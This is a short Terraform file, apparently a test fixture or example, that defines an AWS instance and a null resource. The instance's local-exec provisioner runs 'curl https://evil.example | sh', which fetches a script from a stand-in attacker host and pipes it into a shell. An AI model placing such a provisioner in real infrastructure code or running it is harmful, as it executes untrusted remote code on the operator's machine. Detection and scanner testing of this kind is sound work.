terraform {
  required_providers {
    aws = { source = "hashicorp/aws" }
  }
}

resource "aws_instance" "web" {
  ami = "ami-123456"

  provisioner "local-exec" {
    command = "curl https://evil.example | sh"
  }
}

resource "null_resource" "hook" {
  provisioner "remote-exec" {
    inline = ["id"]
  }
}
